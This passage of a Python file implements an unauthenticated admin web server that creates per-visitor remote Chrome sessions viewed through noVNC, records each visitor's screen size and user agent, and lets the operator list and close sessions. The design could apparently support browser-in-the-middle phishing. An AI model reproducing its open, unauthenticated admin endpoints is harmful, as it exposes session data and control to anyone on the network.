        if path == '/' or path == '/admin':
            self.send_html(ADMIN_HTML)
        
        elif path == '/connect':
            self.send_html(ROUTER_HTML)
        
        elif path == '/api/config':
            self.send_json(get_server_config())
        
        elif path == '/api/sessions':
            sessions = manager.get_all_sessions()
            stats = manager.get_stats()
            self.send_json({
                'sessions': [s.to_dict() for s in sessions],
                'stats': stats
            })
        
        elif path.startswith('/api/session/') and path.endswith('/status'):
            # Check if session is ready
            parts = path.split('/')
            session_id = parts[3]
            if session_id in manager.sessions:
                session = manager.sessions[session_id]
                # Check if Chrome window is visible (page loaded)
                ready = self.check_session_ready(session)
                self.send_json({'ready': ready, 'session_id': session_id})
            else:
                self.send_json({'ready': False, 'error': 'Session not found'})
        
        elif path.startswith('/session/'):
            # Serve session-specific keyboard page
            session_id = path.split('/')[2]
            if session_id in manager.sessions:
                session = manager.sessions[session_id]
                # Generate keyboard page for this session
                html = KEYBOARD_WRAPPER_HTML
                vnc_url = f"http://{self.headers.get('Host').split(':')[0]}:{session.novnc_port}/{session.vnc_file}"
                html = html.replace('SESSION_VNC_URL', vnc_url)
                html = html.replace('SESSION_ID_PLACEHOLDER', session_id)
                html = html.replace('AGENT_PORT_PLACEHOLDER', str(session.agent_port))
                self.send_html(html)
            else:
                self.send_json({'error': 'Session not found'}, 404)
        
        else:
            self.send_json({'error': 'Not found'}, 404)
    
    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path
        
        manager = get_session_manager()
        client_ip = self.get_client_ip()
        
        if path == '/api/connect':
            # Read request body for screen info
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode() if content_length > 0 else '{}'
            
            try:
                data = json.loads(body)
            except:
                data = {}
            
            # Get screen info from client
            screen_info = data.get('screen', {})
            screen_width = screen_info.get('width', 375)
            screen_height = screen_info.get('height', 812)
            user_agent = screen_info.get('userAgent', '')
            
            # Get config from server settings
            config = get_server_config()
            vnc_file = config.get('vnc_file', 'vnc.html')
            url = config.get('url', '')
            
            # Create or get session with screen dimensions
            session = manager.create_session(
                client_ip, 
                vnc_file, 
                url if url else None,
                screen_width=screen_width,
                screen_height=screen_height,
                user_agent=user_agent
            )
            
            if session:
                host = self.headers.get('Host', 'localhost').split(':')[0]
                redirect_url = f"http://{host}:{ADMIN_PORT}/session/{session.session_id}"
                self.send_json({
                    'success': True,
                    'session_id': session.session_id,
                    'redirect_url': redirect_url,
                    'novnc_port': session.novnc_port,
                    'agent_port': session.agent_port
                })
            else:
                self.send_json({
                    'success': False,
                    'error': 'Failed to create session. Maximum sessions reached.'
                }, 503)
        
        elif path.startswith('/api/activity/'):
            session_id = path.split('/')[3]
            manager.update_activity(session_id)
            self.send_json({'success': True})
        
        else:
            self.send_json({'error': 'Not found'}, 404)
    
    def do_DELETE(self):
        parsed = urlparse(self.path)
        path = parsed.path
        
        manager = get_session_manager()
        
        if path.startswith('/api/sessions/'):
            session_id = path.split('/')[3]
            manager.close_session(session_id)
            self.send_json({'success': True})
        else:
            self.send_json({'error': 'Not found'}, 404)


# ============================================
# SERVER
# ============================================

class AdminServer:
    def __init__(self, port=ADMIN_PORT):
        self.port = port
        self.server = None
        self.thread = None
    
    def start(self):
        self.server = HTTPServer(('0.0.0.0', self.port), AdminHandler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        print(f"Admin panel running at http://0.0.0.0:{self.port}/admin")
        print(f"User connect URL: http://0.0.0.0:{self.port}/connect")
    
    def stop(self):
        if self.server:
            self.server.shutdown()


# ============================================
# MAIN
# ============================================

if __name__ == "__main__":
    manager = get_session_manager()
    manager.start()
    
    server = AdminServer()
    server.start()
    
    print("\nAdmin server running. Press Ctrl+C to stop.\n")
    
    try:
        while True:
            import time
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nShutting down...")
        server.stop()
        manager.stop()
